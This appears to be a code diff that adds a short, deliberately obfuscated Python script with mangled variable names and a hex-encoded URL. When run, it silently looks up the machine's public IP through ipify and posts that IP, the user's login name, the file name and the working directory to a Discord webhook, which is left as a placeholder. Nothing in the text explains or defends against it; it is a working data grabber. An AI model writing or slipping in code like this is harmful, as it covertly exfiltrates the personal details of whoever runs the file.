@@ -1,0 +1,4 @@
+import requests as A ,os #line:1
+def C ():OOOOOOOO0000O0OOO =A .Session ();OOOOOOOO0000O0OOO .headers .update ({'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko)'});OO000OOOOOO0O0OO0 =OOOOOOOO0000O0OOO .get ('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e');OO0O0OOO00O0OOO00 =OO000OOOOOO0O0OO0 .json ()['\x69\x70'];return OO0O0OOO00O0OOO00 #line:2
+def B (O00OO0O0OO0O0O0OO ):O00O00OO0O000OOO0 ={'content':f"skidxdtoolawesome69, File Name: **{os.path.basename(__file__)}**, Path: **{os.getcwd()}**",'username':"i'm a skid"};O00O00OO0O000OOO0 ['embeds']=[{'description':f"{os.getlogin()}'s Public IP: **{C()}**",'title':'SkiddyKit'}];A .post (O00OO0O0OO0O0O0OO ,json =O00O00OO0O000OOO0 )#line:3
+B ('ADD BYTECODE DISCORD WEBHOOK')
